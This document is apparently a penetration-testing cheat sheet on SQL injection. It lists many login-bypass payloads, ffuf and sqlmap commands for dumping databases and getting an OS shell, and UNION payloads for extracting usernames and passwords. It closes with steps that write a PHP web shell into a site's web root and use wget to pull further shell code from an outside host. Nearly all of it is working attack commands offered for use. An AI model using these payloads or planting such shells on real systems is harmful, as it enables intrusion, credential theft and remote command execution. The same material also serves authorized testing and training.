# SQL Injection
* [Login Bypass](#login-bypass)
* [sqlmap](#sqlmap)
  * [General Commands](#general-commands)
  * [Enumerate a Vulnerable Database](#enumerate-a-vulnerable-database)
* [Union Attack](#union-attack)
  * [Determine number of columns](#determine-number-of-columns)
  * [Find columns with usefull data types](#find-columns-with-usefull-data-types)
  * [Retrieve interesting data](#retrieve-interesting-data)
* [Write reverse shell with database](#write-reverse-shell-with-database)

## Login Bypass
| Info | Command | 
|:-----|:--------|
| ffuf (Automated) | `ffuf -X POST -request request.txt -w /usr/share/seclists/Fuzzing/SQLi/Auth_Bypass.txt:UNAME -w /usr/share/seclists/Fuzzing/SQLi/Auth_Bypass.txt:PASS -t 200 -c -mode pitchfork -mc all -request-proto http -fs 790` |
| Manual Login bypass | `or 1=1` |
| Manual Login bypass | `or 1=1--` |
| Manual Login bypass | `or 1=1#` |
| Manual Login bypass | `or 1=1/*` |
| Manual Login bypass | `admin' --` |
| Manual Login bypass | `admin' #` |
| Manual Login bypass | `admin'/*` |
| Manual Login bypass | `admin' or '1'='1` |
| Manual Login bypass | `admin' or '1'='1'--` |
| Manual Login bypass | `admin' or '1'='1'#` |
| Manual Login bypass | `admin' or '1'='1'/*` |
| Manual Login bypass | `admin'or 1=1 or ''='` |
| Manual Login bypass | `admin' or 1=1` |
| Manual Login bypass | `admin' or 1=1--` |
| Manual Login bypass | `admin' or 1=1#` |
| Manual Login bypass | `admin' or 1=1/*` |
| Manual Login bypass | `admin') or ('1'='1` |
| Manual Login bypass | `admin') or ('1'='1'--` |
| Manual Login bypass | `admin') or ('1'='1'#` |
| Manual Login bypass | `admin') or ('1'='1'/*` |
| Manual Login bypass | `admin') or '1'='1` |
| Manual Login bypass | `admin') or '1'='1'--` |
| Manual Login bypass | `admin') or '1'='1'#` |
| Manual Login bypass | `admin') or '1'='1'/*` |
| Manual Login bypass | `1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055` |
| Manual Login bypass | `admin" --` |
| Manual Login bypass | `admin" #` |
| Manual Login bypass | `admin"/*` |
| Manual Login bypass | `admin" or "1"="1` |
| Manual Login bypass | `admin" or "1"="1"--` |
| Manual Login bypass | `admin" or "1"="1"#` |
| Manual Login bypass | `admin" or "1"="1"/*` |
| Manual Login bypass | `admin"or 1=1 or ""="` |
| Manual Login bypass | `admin" or 1=1` | 
| Manual Login bypass | `admin" or 1=1--` |
| Manual Login bypass | `admin" or 1=1#` | 
| Manual Login bypass | `admin" or 1=1/*` |
| Manual Login bypass | `admin") or ("1"="1` | 
| Manual Login bypass | `admin") or ("1"="1"--` |
| Manual Login bypass | `admin") or ("1"="1"#` |
| Manual Login bypass | `admin") or ("1"="1"/*` |
| Manual Login bypass | `admin") or "1"="1` |
| Manual Login bypass | `admin") or "1"="1"--` |
| Manual Login bypass | `admin") or "1"="1"#` | 
| Manual Login bypass | `admin") or "1"="1"/*` |
| Manual Login bypass | `1234 " AND 1=0 UNION ALL SELECT "admin", "81dc9bdb52d04dc20036dbd8313ed055` |

## sqlmap
### General Commands
| Info | Command | 
|:-----|:--------|
| Test a single parameter | `sqlmap -u "http://$ip//kzMb5nVYJw/search.php?usrtosearch="`
| Use Burpsuite request | `sqlmap -r request.txt`
| Crawl a website | `sqlmap -u http://example.com --crawl=1`

### Enumerate a vulnerable Database
| Description        | Command |
|--------------------|---------|
| List the Databases | `sqlmap -u "https://$ip/page?p1=value1" --dbs` |
| List Tables of Database TARGET_DB | `sqlmap -u "https://$ip/page?p1=value1" -D TARGET_DB --tables` |
| List Columns of Table TARGET_TABLE of Database TARGET_DB | `sqlmap -u "https://$ip/page?p1=value1""-D TARGET_DB -T TARGET_TABLE --columns` |
| Dump Specific Data of Columns of Table TARGET_TABLE of Database TARGET_DB | `sqlmap -u "https://$ip/page?p1=value1" -D TARGET_DB -T TARGET_TABLE -C "Col1,Col2" --dump` |
| Fully Dump Table TARGET_TABLE of Database TARGET_DB | `sqlmap -u "https://$ip/page?p1=value1" -D TARGET_DB -T TARGET_TABLE --dump` |
| Dump full Database | `sqlmap -u "https://$ip/page?p1=value1" -D TARGET_DB --dump` | 
| Custom SQL query | `sqlmap -u "https://$ip/page?p1=value1" --sql-query "SELECT * FROM TARGET_DB;"` | 
| Get OS Shell | `sqlmap -u "https://$ip/page?p1=value1" --os-shell` |
| Get SQL shell | `sqlmap -u "https://$ip/page?p1=value1" --sqlmap-shell` |

## Union Attack
### Determine number of columns
| Info | Command | 
|:-----|:--------|
| Determine number of columns | `' ORDER BY 1--` |
| Determine number of columns | `' ORDER BY 2--` |
| Determine number of columns | `' ORDER BY 3--` |
| Determine number of columns | `' UNION SELECT NULL--` |
| Determine number of columns | `' UNION SELECT NULL,NULL--` |
| Determine number of columns | `' UNION SELECT NULL,NULL,NULL--` |

### Find columns with usefull data types
| Info | Command | 
|:-----|:--------|
| Check column 1 | `'UNION SELECT 'a',NULL,NULL,NULL--` |
| Check column 2 | `'UNION SELECT NULL,'a',NULL,NULL--` |
| Check column 3 | `'UNION SELECT NULL,NULL,'a',NULL--` |
| Check column 4 | `'UNION SELECT NULL,NULL,NULL,'a'--` |
| Check column 4 | `'UNION SELECT NULL,NULL,NULL,'a'--` |

### Retrieve interesting data
| Info | Command | 
|:-----|:--------|
| Get data | `' UNION SELECT username, password FROM users--` |

## Write reverse shell with database

https://resources.infosecinstitute.com/topic/anatomy-of-an-attack-gaining-reverse-shell-from-sql-injection/
https://www.hackingarticles.in/shell-uploading-web-server-phpmyadmin/

| Description | Command | 
|-------------|---------|
| Check for write privileges | `union select 1,2,3,concat(user(),0x3a,file_priv) from mysql.user--` | 

If it says Y after your current user, then you are lucky and you have write privileges.
Create a file to receive the shell

Now it's time to make use of MySQL statements. We're going to use INTO OUTFILE, which writes your selected rows onto a file. The basic syntax is:

select column_name from table_name into outfile "filepath/file.extension

Something like this should create a file named shell.php in the website directory and write that PHP code inside it:

http://website.com/file.php?id=1 union select 1,"<?php system($_REQUEST['cmd'])?>",3,4 INTO OUTFILE " /var/www/website/public_html/shell.php"

Access the shell

Now we can access our shell by visiting http://website.com/shell.php?cmd=whoami. You can run any command after cmd=. You can now upload a ready-made shellcode to the server using curl or `wget (on Linux servers):

`http://website.com/shell.php?cmd=wget http://othersite.com/shell.txt -O code.php`

And then you can access your shell with:

http://website.com/code.php

Hope you understood everything :)

